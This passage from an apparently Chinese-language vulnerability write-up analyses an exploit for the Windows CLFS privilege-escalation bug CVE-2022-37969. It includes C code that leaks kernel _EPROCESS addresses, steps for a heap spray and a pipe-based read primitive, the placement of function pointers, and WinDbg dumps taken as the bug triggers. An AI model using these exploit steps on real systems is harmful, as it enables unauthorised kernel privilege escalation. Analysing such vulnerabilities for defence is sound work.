</span></span></code></pre></div><p>EXP通过调用<code>NtQuerySystemInformation</code> 函数，并将<code>SystemInformationClass</code> 参数设置为<code>SystemExtendedHandleInformation</code> 查询系统句柄信息（进程），遍历handle 列表，通过比较UniqueProcessId来确定找到的进程PID并返回其_EPROCESS地址，EXP中分别获取到自身的_EPROCESS地址和pid为4的进程的_EPROCESS地址。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>status <span style=color:#f92672>=</span> <span style=color:#a6e22e>fnNtQuerySystemInformation</span>((SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, handleInfo, handleInfoSize, <span style=color:#f92672>&amp;</span>retLength);
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (ULONG i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> handleInfo<span style=color:#f92672>-&gt;</span>NumberOfHandles; i<span style=color:#f92672>++</span>)
</span></span><span style=display:flex><span>				{
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>if</span> ((USHORT)Object <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x4</span>)
</span></span><span style=display:flex><span>					{
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>0x4</span> <span style=color:#f92672>==</span> (DWORD)handleInfo<span style=color:#f92672>-&gt;</span>Handles[i].UniqueProcessId <span style=color:#f92672>&amp;&amp;</span> (SIZE_T)Object <span style=color:#f92672>==</span> (SIZE_T)handleInfo<span style=color:#f92672>-&gt;</span>Handles[i].HandleValue)
</span></span><span style=display:flex><span>						{
</span></span><span style=display:flex><span>							kernelAddress <span style=color:#f92672>=</span> (SIZE_T)handleInfo<span style=color:#f92672>-&gt;</span>Handles[i].Object;
</span></span><span style=display:flex><span>							bFind <span style=color:#f92672>=</span> TRUE;
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>						}
</span></span><span style=display:flex><span>					}
</span></span><span style=display:flex><span>					<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>					{
</span></span><span style=display:flex><span>						<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>GetCurrentProcessId</span>() <span style=color:#f92672>==</span> (DWORD)handleInfo<span style=color:#f92672>-&gt;</span>Handles[i].UniqueProcessId <span style=color:#f92672>&amp;&amp;</span> (SIZE_T)Object <span style=color:#f92672>==</span> (SIZE_T)handleInfo<span style=color:#f92672>-&gt;</span>Handles[i].HandleValue)
</span></span><span style=display:flex><span>						{
</span></span><span style=display:flex><span>							kernelAddress <span style=color:#f92672>=</span> (SIZE_T)handleInfo<span style=color:#f92672>-&gt;</span>Handles[i].Object;
</span></span><span style=display:flex><span>							bFind <span style=color:#f92672>=</span> TRUE;
</span></span><span style=display:flex><span>							<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>						}
</span></span><span style=display:flex><span>					}
</span></span><span style=display:flex><span>				}
</span></span></code></pre></div><p>EXP进行堆喷射，循环在偏移0x10000开始每隔0x10位置写入0x500000。</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/7.png></p><p>绕过CreatePipe创建管道并通过<code>NtFsControlFile</code>设置管道属性，其中<code>FsControlCode</code> 参数被设为0x11003c，这使得在之后可以通过调用<code>NtFsControlFile</code>并传递<code>FsControlCode</code> 参数为0x110038来读取管道属性。</p><p>EXP通过调用<code>NtQuerySystemInformation</code>并传递<code>SystemInformationClass</code>参数为<code>SystemBigPoolInformation</code>查询内核堆信息。通过循环遍历堆信息并比较堆tag找到了Pipe堆在内核的地址。</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/8.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db ffffa48d64eff000
</span></span><span style=display:flex><span>ffffa48d<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>64</span>eff000  <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>25</span> a6 <span style=color:#ae81ff>67</span> <span style=color:#ae81ff>8</span>d a4 ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>50</span> <span style=color:#ae81ff>25</span> a6 <span style=color:#ae81ff>67</span> <span style=color:#ae81ff>8</span>d a4 ff ff  P<span style=color:#f92672>%</span>.g....P<span style=color:#f92672>%</span>.g....
</span></span><span style=display:flex><span>ffffa48d<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>64</span>eff010  <span style=color:#ae81ff>28</span> f0 ef <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>8</span>d a4 ff ff<span style=color:#f92672>-</span>d6 <span style=color:#ae81ff>0f</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  (..d............
</span></span><span style=display:flex><span>ffffa48d<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>64</span>eff020  <span style=color:#ae81ff>2</span>a f0 ef <span style=color:#ae81ff>64</span> <span style=color:#ae81ff>8</span>d a4 ff ff<span style=color:#f92672>-</span><span style=color:#ae81ff>5</span>a <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  <span style=color:#f92672>*</span>..d....Z.......
</span></span><span style=display:flex><span>ffffa48d<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>64</span>eff030  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span><span style=color:#f92672>-</span><span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  AAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>ffffa48d<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>64</span>eff040  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span><span style=color:#f92672>-</span><span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  AAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>ffffa48d<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>64</span>eff050  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span><span style=color:#f92672>-</span><span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  AAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>ffffa48d<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>64</span>eff060  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span><span style=color:#f92672>-</span><span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  AAAAAAAAAAAAAAAA
</span></span><span style=display:flex><span>ffffa48d<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>64</span>eff070  <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span><span style=color:#f92672>-</span><span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span> <span style=color:#ae81ff>41</span>  AAAAAAAAAAAAAAAA
</span></span></code></pre></div><p>将系统EPROCESS进行异或后存到栈上的地址中</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/9.png></p><p>将41414141写到0x100000007的内存地址上</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/10.png></p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/11.png></p><p>获取到<code>SeSetAccessStateGenericMapping</code>函数地址</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/12.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> u fffff8046b3f2da0
</span></span><span style=display:flex><span>nt<span style=color:#f92672>!</span>SeSetAccessStateGenericMapping:
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>b3f2da0 <span style=color:#ae81ff>488</span>b4148        mov     rax,qword ptr [rcx<span style=color:#f92672>+</span><span style=color:#ae81ff>48</span>h]
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>b3f2da4 <span style=color:#ae81ff>0f</span><span style=color:#ae81ff>1002</span>          movups  xmm0,xmmword ptr [rdx]
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>b3f2da7 f30f7f4008      movdqu  xmmword ptr [rax<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>],xmm0
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>b3f2dac c3              ret
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>b3f2dad cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>b3f2dae cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>b3f2daf cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>b3f2db0 cc              <span style=color:#66d9ef>int</span>     <span style=color:#ae81ff>3</span>
</span></span></code></pre></div><p>获取<code>ClfsEarlierLsn</code>的内核地址</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/13.png></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> u FFFFF8046A9F1CB0
</span></span><span style=display:flex><span>CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn:
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1cb0 <span style=color:#ae81ff>488</span>b05c1240000  mov     rax,qword ptr [CLFS<span style=color:#f92672>!</span><span style=color:#a6e22e>CLFS_LSN_INVALID</span> (fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f4178)]
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1cb7 <span style=color:#ae81ff>4885</span>c9          test    rcx,rcx
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1cba <span style=color:#ae81ff>7436</span>            je      CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x42</span> (fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1cf2)
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1cbc <span style=color:#ae81ff>488</span>b09          mov     rcx,qword ptr [rcx]
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1cbf <span style=color:#ae81ff>483</span>b0d82210000  cmp     rcx,qword ptr [CLFS<span style=color:#f92672>!</span><span style=color:#a6e22e>CLFS_LSN_NULL</span> (fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f3e48)]
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1cc6 <span style=color:#ae81ff>742</span>a            je      CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x42</span> (fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1cf2)
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1cc8 <span style=color:#ae81ff>483</span>bc8          cmp     rcx,rax
</span></span><span style=display:flex><span>fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1ccb <span style=color:#ae81ff>7425</span>            je      CLFS<span style=color:#f92672>!</span>ClfsEarlierLsn<span style=color:#f92672>+</span><span style=color:#ae81ff>0x42</span> (fffff804<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>6</span>a9f1cf2)
</span></span></code></pre></div><p>把两个函数布局到0x500008和0x500018上</p><p><img alt src=/images/vulnerability/Windows-CLFS-EoP/CVE-2022-37969.zh-cn.assets/14.png></p><p>触发漏洞<code>pContainer</code>指针高5位被清零，指针指向0x593a0，该地址为用户层内存地址。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db rax
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>dd070  <span style=color:#ae81ff>06</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>69</span> be <span style=color:#ae81ff>23</span> a9 <span style=color:#ae81ff>92</span> <span style=color:#ae81ff>15</span> ee <span style=color:#ae81ff>11</span>  ........i.<span style=color:#960050;background-color:#1e0010>#</span>.....
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>dd080  bc <span style=color:#ae81ff>80</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>0</span>c <span style=color:#ae81ff>29</span> <span style=color:#ae81ff>07</span> fc <span style=color:#ae81ff>32</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ....).<span style=color:#ae81ff>.2</span>........
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>dd090  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>dd0a0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>38</span> <span style=color:#ae81ff>13</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  .......<span style=color:#ae81ff>.8</span>.......
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>dd0b0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>dd0c0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>dd0d0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>dd0e0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db rax <span style=color:#f92672>-</span><span style=color:#ae81ff>0x11000</span>
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>cc070  <span style=color:#ae81ff>01</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>b <span style=color:#ae81ff>21</span> <span style=color:#ae81ff>72</span> e4 <span style=color:#ae81ff>7f</span> <span style=color:#ae81ff>15</span> ee <span style=color:#ae81ff>11</span>  ........<span style=color:#f92672>+!</span>r.....
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>cc080  bc <span style=color:#ae81ff>7f</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>0</span>c <span style=color:#ae81ff>29</span> <span style=color:#ae81ff>07</span> fc <span style=color:#ae81ff>32</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ....).<span style=color:#ae81ff>.2</span>........
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>cc090  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>cc0a0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>cc0b0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>cc0c0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>38</span> <span style=color:#ae81ff>13</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  .......<span style=color:#ae81ff>.8</span>.......
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>cc0d0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>cc0e0  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ................
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#f92672>:</span> kd<span style=color:#f92672>&gt;</span> db rax <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1468</span>
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de4d8  <span style=color:#ae81ff>08</span> f0 fd c1 <span style=color:#ae81ff>30</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span><span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>08</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ...<span style=color:#ae81ff>.0</span>...........
</span></span><span style=display:flex><span>ffffbc0b<span style=color:#960050;background-color:#1e0010>`</span><span style=color:#ae81ff>276</span>de4e8  <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span><span style=color:#f92672>-</span>a0 <span style=color:#ae81ff>93</span> <span style=color:#ae81ff>50</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span>  ..........P.....
